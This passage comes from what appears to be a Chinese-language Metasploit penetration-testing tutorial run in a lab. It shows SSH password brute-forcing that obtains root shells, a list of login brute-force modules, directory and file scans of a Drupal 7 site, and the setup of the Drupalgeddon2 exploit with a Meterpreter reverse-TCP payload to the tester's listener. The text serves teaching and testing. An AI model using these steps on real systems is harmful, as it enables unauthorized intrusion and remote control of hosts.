[-] 192.33.6.150:22 - Failed: &#39;root:&#39;
[+] 192.33.6.150:22 - Success: &#39;root:root&#39; &#39;uid=0(root) gid=0(root) groups=0(root) Linux Pentesting 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64 GNU/Linux &#39;
[*] Command shell session 1 opened (192.33.6.150:45871 -&gt; 192.33.6.150:22) at 2020-06-22 22:50:03 -0400
[-] 192.33.6.150:22 - Failed: &#39;r00t:&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:root&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:123456&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:woaini&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:qftm&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:hack&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:pass1&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:qweasd&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:iloveyou&#39;
[-] 192.33.6.150:22 - Failed: &#39;r00t:admin&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:root&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:123456&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:woaini&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:qftm&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:hack&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:pass1&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:qweasd&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:iloveyou&#39;
[-] 192.33.6.150:22 - Failed: &#39;roots:admin&#39;
[-] 192.33.6.150:22 - Failed: &#39;qftm:&#39;
[-] 192.33.6.150:22 - Failed: &#39;qftm:root&#39;
[-] 192.33.6.150:22 - Failed: &#39;qftm:123456&#39;
[-] 192.33.6.150:22 - Failed: &#39;qftm:woaini&#39;
[+] 192.33.6.150:22 - Success: &#39;qftm:qftm&#39; &#39;uid=0(root) gid=0(root) groups=0(root),24(cdrom),27(sudo),29(audio),44(video) Linux Pentesting 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64 GNU/Linux &#39;
[*] Command shell session 2 opened (192.33.6.150:37349 -&gt; 192.33.6.150:22) at 2020-06-22 22:51:03 -0400
[-] 192.33.6.150:22 - Failed: &#39;admin:&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:root&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:123456&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:woaini&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:qftm&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:hack&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:pass1&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:qweasd&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:iloveyou&#39;
[-] 192.33.6.150:22 - Failed: &#39;admin:admin&#39;
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) &gt; </code></pre><p>从暴力破解日志结果看到，成功破解了主机<code>192.33.6.150</code>的SSH服务口令，并且MSF自动给我们连接了一个session会话</p>
<pre><code>[+] 192.33.6.150:22 - Success: &#39;qftm:qftm&#39; &#39;uid=0(root) gid=0(root) groups=0(root),24(cdrom),27(sudo),29(audio),44(video) Linux Pentesting 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64 GNU/Linux &#39;
[*] Command shell session 2 opened (192.33.6.150:37349 -&gt; 192.33.6.150:22) at 2020-06-22 22:51:03 -0400</code></pre><p>通过sessionID连接进入会话</p>
<pre><code>msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 2
[*] Starting interaction with 2...

id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),27(sudo),29(audio),44(video)
whoami
root
exit

[*] 192.33.6.150 - Command shell session 2 closed.  Reason: User exit
msf5 auxiliary(scanner/ssh/ssh_login) &gt; </code></pre><ul>
<li>其他服务口令猜解</li>
</ul>
<p>使用search进行特定搜索</p>
<pre><code>msf5 &gt; search type:auxiliary path:_login

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank    Check  Description
   -   ----                                                       ---------------  ----    -----  -----------
   0   auxiliary/admin/mssql/mssql_enum_sql_logins                                 normal  No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   1   auxiliary/admin/oracle/oracle_login                        2008-11-20       normal  No     Oracle Account Discovery
   2   auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                               normal  No     SMB NTLMv1 Login Request Corruption
   3   auxiliary/fuzzers/tds/tds_login_corrupt                                     normal  No     TDS Protocol Login Request Corruption Fuzzer
   4   auxiliary/fuzzers/tds/tds_login_username                                    normal  No     TDS Protocol Login Request Username Fuzzer
   5   auxiliary/scanner/afp/afp_login                                             normal  No     Apple Filing Protocol Login Utility
   6   auxiliary/scanner/couchdb/couchdb_login                                     normal  No     CouchDB Login Utility
   7   auxiliary/scanner/ftp/ftp_login                                             normal  No     FTP Authentication Scanner
   8   auxiliary/scanner/http/advantech_webaccess_login                            normal  No     Advantech WebAccess Login
   9   auxiliary/scanner/http/appletv_login                                        normal  No     AppleTV AirPlay Login Utility
   10  auxiliary/scanner/http/axis_login                                           normal  No     Apache Axis2 Brute Force Utility
   11  auxiliary/scanner/http/bavision_cam_login                                   normal  No     BAVision IP Camera Web Server Login
   12  auxiliary/scanner/http/binom3_login_config_pass_dump                        normal  No     Binom3 Web Management Login Scanner, Config and Password File Dump
   13  auxiliary/scanner/http/buffalo_login                                        normal  No     Buffalo NAS Login Utility
   14  auxiliary/scanner/http/buildmaster_login                                    normal  No     Inedo BuildMaster Login Scanner
   15  auxiliary/scanner/http/caidao_bruteforce_login                              normal  No     Chinese Caidao Backdoor Bruteforce
   16  auxiliary/scanner/http/chef_webui_login                                     normal  No     Chef Web UI Brute Force Utility
   17  auxiliary/scanner/http/cisco_firepower_login                                normal  No     Cisco Firepower Management Console 6.0 Login
   18  auxiliary/scanner/http/cnpilot_r_web_login_loot                             normal  No     Cambium cnPilot r200/r201 Login Scanner and Config Dump
   19  auxiliary/scanner/http/directadmin_login                                    normal  No     DirectAdmin Web Control Panel Login Utility
   20  auxiliary/scanner/http/dlink_dir_300_615_http_login                         normal  No     D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility
   21  auxiliary/scanner/http/dlink_dir_615h_http_login                            normal  No     D-Link DIR-615H HTTP Login Utility
   22  auxiliary/scanner/http/dlink_dir_session_cgi_http_login                     normal  No     D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility
   23  auxiliary/scanner/http/dolibarr_login                                       normal  No     Dolibarr ERP/CRM Login Utility
   24  auxiliary/scanner/http/epmp1000_web_login                                   normal  No     Cambium ePMP 1000 Login Scanner
   25  auxiliary/scanner/http/etherpad_duo_login                                   normal  No     EtherPAD Duo Login Bruteforce Utility
   26  auxiliary/scanner/http/frontpage_login                                      normal  No     FrontPage Server Extensions Anonymous Login Scanner
   27  auxiliary/scanner/http/gavazzi_em_login_loot                                normal  No     Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database
   28  auxiliary/scanner/http/gitlab_login                                         normal  No     GitLab Login Utility
   29  auxiliary/scanner/http/glassfish_login                                      normal  No     GlassFish Brute Force Utility
   30  auxiliary/scanner/http/hp_sys_mgmt_login                                    normal  No     HP System Management Homepage Login Utility
   31  auxiliary/scanner/http/http_login                                           normal  No     HTTP Login Utility
   32  auxiliary/scanner/http/ipboard_login                                        normal  No     IP Board Login Auxiliary Module
   33  auxiliary/scanner/http/jenkins_login                                        normal  No     Jenkins-CI Login Utility
   34  auxiliary/scanner/http/joomla_bruteforce_login                              normal  No     Joomla Bruteforce Login Utility
   35  auxiliary/scanner/http/manageengine_desktop_central_login                   normal  No     ManageEngine Desktop Central Login Utility
   36  auxiliary/scanner/http/mybook_live_login                                    normal  No     Western Digital MyBook Live Login Utility
   37  auxiliary/scanner/http/octopusdeploy_login                                  normal  No     Octopus Deploy Login Utility
   38  auxiliary/scanner/http/onion_omega2_login                  2019-03-27       normal  No     Onion Omega2 Login Brute-Force
   39  auxiliary/scanner/http/openmind_messageos_login                             normal  No     OpenMind Message-OS Portal Login Brute Force Utility
   40  auxiliary/scanner/http/oracle_ilom_login                                    normal  No     Oracle ILO Manager Login Brute Force Utility
   41  auxiliary/scanner/http/owa_ews_login                                        normal  No     OWA Exchange Web Services (EWS) Login Scanner
   42  auxiliary/scanner/http/owa_login                                            normal  No     Outlook Web App (OWA) Brute Force Utility
   43  auxiliary/scanner/http/phpmyadmin_login                                     normal  No     PhpMyAdmin Login Scanner
   44  auxiliary/scanner/http/pocketpad_login                                      normal  No     PocketPAD Login Bruteforce Force Utility
   45  auxiliary/scanner/http/splunk_web_login                                     normal  No     Splunk Web Interface Login Utility
   46  auxiliary/scanner/http/symantec_web_gateway_login                           normal  No     Symantec Web Gateway Login Utility
   47  auxiliary/scanner/http/tomcat_mgr_login                                     normal  No     Tomcat Application Manager Login Utility
   48  auxiliary/scanner/http/vcms_login                                           normal  No     V-CMS Login Utility
   49  auxiliary/scanner/http/wordpress_login_enum                                 normal  No     WordPress Brute Force and User Enumeration Utility
   50  auxiliary/scanner/http/wordpress_xmlrpc_login                               normal  No     Wordpress XML-RPC Username/Password Login Scanner
   51  auxiliary/scanner/http/zabbix_login                                         normal  No     Zabbix Server Brute Force Utility
   52  auxiliary/scanner/lotus/lotus_domino_login                                  normal  No     Lotus Domino Brute Force Utility
   53  auxiliary/scanner/misc/cctv_dvr_login                                       normal  No     CCTV DVR Login Scanning Utility
   54  auxiliary/scanner/misc/ibm_mq_login                                         normal  No     IBM WebSphere MQ Login Check
   55  auxiliary/scanner/mongodb/mongodb_login                                     normal  No     MongoDB Login Utility
   56  auxiliary/scanner/msf/msf_rpc_login                                         normal  No     Metasploit RPC Interface Login Utility
   57  auxiliary/scanner/msf/msf_web_login                                         normal  No     Metasploit Web Interface Login Utility
   58  auxiliary/scanner/mssql/mssql_login                                         normal  No     MSSQL Login Utility
   59  auxiliary/scanner/mysql/mysql_login                                         normal  No     MySQL Login Utility
   60  auxiliary/scanner/nessus/nessus_ntp_login                                   normal  No     Nessus NTP Login Utility
   61  auxiliary/scanner/nessus/nessus_rest_login                                  normal  No     Nessus RPC Interface Login Utility
   62  auxiliary/scanner/nessus/nessus_xmlrpc_login                                normal  No     Nessus XMLRPC Interface Login Utility
   63  auxiliary/scanner/nexpose/nexpose_api_login                                 normal  No     NeXpose API Interface Login Utility
   64  auxiliary/scanner/nntp/nntp_login                                           normal  No     NNTP Login Utility
   65  auxiliary/scanner/openvas/openvas_gsad_login                                normal  No     OpenVAS gsad Web Interface Login Utility
   66  auxiliary/scanner/openvas/openvas_omp_login                                 normal  No     OpenVAS OMP Login Utility
   67  auxiliary/scanner/openvas/openvas_otp_login                                 normal  No     OpenVAS OTP Login Utility
   68  auxiliary/scanner/oracle/isqlplus_login                                     normal  No     Oracle iSQL*Plus Login Utility
   69  auxiliary/scanner/oracle/oracle_login                                       normal  No     Oracle RDBMS Login Utility
   70  auxiliary/scanner/pcanywhere/pcanywhere_login                               normal  No     PcAnywhere Login Scanner
   71  auxiliary/scanner/pop3/pop3_login                                           normal  No     POP3 Login Utility
   72  auxiliary/scanner/postgres/postgres_login                                   normal  No     PostgreSQL Login Utility
   73  auxiliary/scanner/redis/redis_login                                         normal  No     Redis Login Utility
   74  auxiliary/scanner/rservices/rexec_login                                     normal  No     rexec Authentication Scanner
   75  auxiliary/scanner/rservices/rlogin_login                                    normal  No     rlogin Authentication Scanner
   76  auxiliary/scanner/rservices/rsh_login                                       normal  No     rsh Authentication Scanner
   77  auxiliary/scanner/sap/sap_mgmt_con_brute_login                              normal  No     SAP Management Console Brute Force
   78  auxiliary/scanner/sap/sap_soap_rfc_brute_login                              normal  No     SAP SOAP Service RFC_PING Login Brute Forcer
   79  auxiliary/scanner/sap/sap_web_gui_brute_login                               normal  No     SAP Web GUI Login Brute Forcer
   80  auxiliary/scanner/scada/koyo_login                         2012-01-19       normal  No     Koyo DirectLogic PLC Password Brute Force Utility
   81  auxiliary/scanner/smb/smb_login                                             normal  No     SMB Login Check Scanner
   82  auxiliary/scanner/snmp/snmp_login                                           normal  No     SNMP Community Login Scanner
   83  auxiliary/scanner/ssh/karaf_login                                           normal  No     Apache Karaf Login Utility
   84  auxiliary/scanner/ssh/ssh_login                                             normal  No     SSH Login Check Scanner
   85  auxiliary/scanner/ssh/ssh_login_pubkey                                      normal  No     SSH Public Key Login Scanner
   86  auxiliary/scanner/telnet/brocade_enable_login                               normal  No     Brocade Enable Login Check Scanner
   87  auxiliary/scanner/telnet/telnet_login                                       normal  No     Telnet Login Check Scanner
   88  auxiliary/scanner/teradata/teradata_odbc_login             2018-03-30       normal  No     Teradata ODBC Login Scanner Module
   89  auxiliary/scanner/varnish/varnish_cli_login                                 normal  No     Varnish Cache CLI Login Utility
   90  auxiliary/scanner/vmware/vmauthd_login                                      normal  No     VMWare Authentication Daemon Login Scanner
   91  auxiliary/scanner/vmware/vmware_http_login                                  normal  No     VMWare Web Login Scanner
   92  auxiliary/scanner/vnc/vnc_login                                             normal  No     VNC Authentication Scanner
   93  auxiliary/scanner/winrm/winrm_login                                         normal  No     WinRM Login Utility
   94  auxiliary/voip/asterisk_login                                               normal  No     Asterisk Manager Login Utility

msf5 &gt; </code></pre><h3 id="网站敏感目录扫描"><a href="#网站敏感目录扫描" class="headerlink" title="网站敏感目录扫描"></a>网站敏感目录扫描</h3><p>可以借助 Metasploit 中的 <code>brute_dirs、dir_listing、dir_scanner</code> 等辅助模块来进行网站敏感目录扫描。</p>
<p>他们主要使用暴力猜解的方式工作，注意此处需要提供一个目录字典。</p>
<pre><code>msf5 &gt; use auxiliary/scanner/http/dir_scanner
msf5 auxiliary(scanner/http/dir_scanner) &gt; show options 

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                                        yes       The number of concurrent threads (max one per host)
   VHOST                                                                no        HTTP server virtual host

msf5 auxiliary(scanner/http/dir_scanner) &gt; set rhosts 192.33.6.147
rhosts =&gt; 192.33.6.147
msf5 auxiliary(scanner/http/dir_scanner) &gt; set threads 50
threads =&gt; 50
msf5 auxiliary(scanner/http/dir_scanner) &gt; show options 

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.33.6.147                                             yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     50                                                       yes       The number of concurrent threads (max one per host)
   VHOST                                                                no        HTTP server virtual host

msf5 auxiliary(scanner/http/dir_scanner) &gt; run

[*] Detecting error code
[*] Using code &#39;404&#39; as not found for 192.33.6.147
[+] Found http://192.33.6.147:80/.../ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/.CVS/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/0/ 200 (192.33.6.147)
[+] Found http://192.33.6.147:80/Admin/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/USER/ 200 (192.33.6.147)
[+] Found http://192.33.6.147:80/admin/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/batch/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/cgi-bin/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/icons/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/includes/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/misc/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/modules/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/node/ 200 (192.33.6.147)
[+] Found http://192.33.6.147:80/profiles/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/scripts/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/search/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/sites/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/themes/ 403 (192.33.6.147)
[+] Found http://192.33.6.147:80/user/ 200 (192.33.6.147)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/dir_scanner) &gt;</code></pre><h3 id="网站敏感文件扫描"><a href="#网站敏感文件扫描" class="headerlink" title="网站敏感文件扫描"></a>网站敏感文件扫描</h3><p>通过控制台执行系统命令，运行第三方下载的工具进行敏感文件的扫描</p>
<pre><code>msf5 &gt; python3 dirsearch.py -u http://192.33.6.147 -e *
[*] exec: python3 dirsearch.py -u http://192.33.6.147 -e *


 _|. _ _  _  _  _ _|_    v0.3.9                                                                                     
(_||| _) (/_(_|| (_| )                                                                                              

Extensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6130

Error Log: /mnt/hgfs/QSec/Pentest/dirsearch/logs/errors-20-06-23_12-12-54.log

Target: http://192.33.6.147                                                                           
[12:12:54] Starting: 

[12:13:02] 200 -    7KB - /0 
[12:17:13] 301 -  315B  - /includes  -&gt;  http://192.33.6.147/includes/ 
[12:17:18] 200 -    7KB - /index.php 
[12:17:20] 200 -   17KB - /INSTALL                 
[12:17:21] 403 -  291B  - /install.inc      
[12:17:21] 403 -  293B  - /INSTALL.mysql
[12:17:21] 403 -  293B  - /install.mysql
[12:17:21] 200 -    1KB - /INSTALL.mysql.txt
[12:17:22] 403 -  293B  - /INSTALL.pgsql
[12:17:22] 403 -  293B  - /install.pgsql
[12:17:22] 200 -    2KB - /INSTALL.pgsql.txt
[12:17:22] 403 -  291B  - /install.sql 
[12:17:22] 403 -  291B  - /install.tpl
[12:17:22] 200 -   17KB - /INSTALL.txt
[12:17:22] 200 -    3KB - /install.php
[12:17:37] 200 -   18KB - /LICENSE                                        
[12:17:37] 200 -   18KB - /LICENSE.txt
[12:18:23] 200 -    7KB - /node                                
[12:18:29] 403 -  290B  - /orders.sql                                          
[12:19:10] 301 -  315B  - /profiles  -&gt;  http://192.33.6.147/profiles/                   
[12:19:10] 403 -  309B  - /profiles/minimal/minimal.info
[12:19:10] 403 -  311B  - /profiles/standard/standard.info
[12:19:10] 403 -  309B  - /profiles/testing/testing.info
[12:19:16] 200 -    5KB - /README                
[12:19:17] 200 -    5KB - /README.txt                      
[12:19:22] 403 -  292B  - /revision.inc         
[12:19:22] 200 -    2KB - /robots.txt        
[12:19:22] 403 -  284B  - /Root
[12:19:24] 403 -  289B  - /sales.sql                 
[12:19:25] 403 -  290B  - /schema.sql               
[12:19:26] 301 -  314B  - /scripts  -&gt;  http://192.33.6.147/scripts/
[12:20:32] 200 -    9KB - /UPGRADE                                          
[12:20:33] 200 -    9KB - /UPGRADE.txt                            
[12:20:38] 200 -    7KB - /user                
[12:20:38] 200 -    7KB - /user/
[12:20:48] 200 -    2KB - /web.config
[12:21:03] 200 -   42B  - /xmlrpc.php
Task Completed                                       
msf5 &gt; </code></pre><h2 id="网络服务渗透测试"><a href="#网络服务渗透测试" class="headerlink" title="网络服务渗透测试"></a>网络服务渗透测试</h2><h3 id="Drupal组件渗透"><a href="#Drupal组件渗透" class="headerlink" title="Drupal组件渗透"></a>Drupal组件渗透</h3><p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a href="https://baike.baidu.com/item/内容管理系统/2683135" target="_blank" rel="noopener">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成。</p>
<ul>
<li>信息收集</li>
</ul>
<p>前期的情报搜集得到主机<code>192.33.6.147</code>、开放<code>80</code>端口，尝试访问继续探索</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200624103650981.png" alt="image-20200624103650981"></p>
<p>使用<code>wappalyzer</code>探索其网站框架为<code>Drupal</code>、且版本为<code>7</code>、<code>Debian Apache 2.2.22 PHP 5.4.45</code></p>
<p><img src="/2020/06/20/metasploit-framework/image-20200624104321721.png" alt="image-20200624104321721"></p>
<p>后续利用<code>Metasploit</code>进行渗透测试</p>
<ul>
<li>搜索相关模块</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> search drupal

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   <span class="token comment" spellcheck="true">#  Name                                           Disclosure Date  Rank       Check  Description</span>
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entiy Injection
   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Eumeration
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Vlue SQL Injection
   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote ommand Execution
   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 FormsAPI Property Injection
   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module RemotePHP Code Execution
   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Servicesunserialize<span class="token punctuation">(</span><span class="token punctuation">)</span> RCE
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code xecution


msf5 <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>模块配置</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span>:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  <span class="token boolean">false</span>            no        Dump payload <span class="token function">command</span> output
   PHP_FUNC     passthru         <span class="token function">yes</span>       PHP <span class="token keyword">function</span> to execute
   Proxies                       no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
   RHOSTS                        <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT        80               <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SSL          <span class="token boolean">false</span>            no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
   TARGETURI    /                <span class="token function">yes</span>       Path to Drupal <span class="token function">install</span>
   VHOST                         no        HTTP server virtual host


Payload options <span class="token punctuation">(</span>multi/meterpreter/reverse_https<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.33.6.150     <span class="token function">yes</span>       The local listener <span class="token function">hostname</span>
   LPORT  8443             <span class="token function">yes</span>       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic <span class="token punctuation">(</span>PHP In-Memory<span class="token punctuation">)</span>


msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 192.33.6.147
rhosts <span class="token operator">=</span><span class="token operator">></span> 192.33.6.147
msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Automatic <span class="token punctuation">(</span>PHP In-Memory<span class="token punctuation">)</span>
   1   Automatic <span class="token punctuation">(</span>PHP Dropper<span class="token punctuation">)</span>
   2   Automatic <span class="token punctuation">(</span>Unix In-Memory<span class="token punctuation">)</span>
   3   Automatic <span class="token punctuation">(</span>Linux Dropper<span class="token punctuation">)</span>
   4   Drupal 7.x <span class="token punctuation">(</span>PHP In-Memory<span class="token punctuation">)</span>
   5   Drupal 7.x <span class="token punctuation">(</span>PHP Dropper<span class="token punctuation">)</span>
   6   Drupal 7.x <span class="token punctuation">(</span>Unix In-Memory<span class="token punctuation">)</span>
   7   Drupal 7.x <span class="token punctuation">(</span>Linux Dropper<span class="token punctuation">)</span>
   8   Drupal 8.x <span class="token punctuation">(</span>PHP In-Memory<span class="token punctuation">)</span>
   9   Drupal 8.x <span class="token punctuation">(</span>PHP Dropper<span class="token punctuation">)</span>
   10  Drupal 8.x <span class="token punctuation">(</span>Unix In-Memory<span class="token punctuation">)</span>
   11  Drupal 8.x <span class="token punctuation">(</span>Linux Dropper<span class="token punctuation">)</span>


msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload php/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span>:

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  <span class="token boolean">false</span>            no        Dump payload <span class="token function">command</span> output
   PHP_FUNC     passthru         <span class="token function">yes</span>       PHP <span class="token keyword">function</span> to execute
   Proxies                       no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
   RHOSTS       192.33.6.147     <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
   RPORT        80               <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
   SSL          <span class="token boolean">false</span>            no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
   TARGETURI    /                <span class="token function">yes</span>       Path to Drupal <span class="token function">install</span>
   VHOST                         no        HTTP server virtual host


Payload options <span class="token punctuation">(</span>php/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT  8443             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic <span class="token punctuation">(</span>PHP In-Memory<span class="token punctuation">)</span>


msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>攻击获取会话</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8443 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>38288 bytes<span class="token punctuation">)</span> to 192.33.6.147
